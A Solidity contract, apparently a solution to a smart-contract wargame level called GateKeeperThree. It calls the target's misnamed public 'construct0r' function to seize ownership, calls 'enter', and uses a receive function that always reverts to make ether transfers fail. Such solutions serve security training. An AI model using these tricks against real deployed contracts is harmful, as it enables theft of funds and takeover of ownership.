// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperThree{
    function construct0r() external ;
    function enter() external ;

}
contract GateKeeperThreeAttacker {
    address gateKeeperThree;

    constructor(address _gateKeeperThree){
        gateKeeperThree = _gateKeeperThree;
    }

    function callConstruct0r() external {
        IGateKeeperThree(gateKeeperThree).construct0r();
    }

    receive() external payable { 
        revert();
    }

    function callEnter() external {
        IGateKeeperThree(gateKeeperThree).enter();
    }
}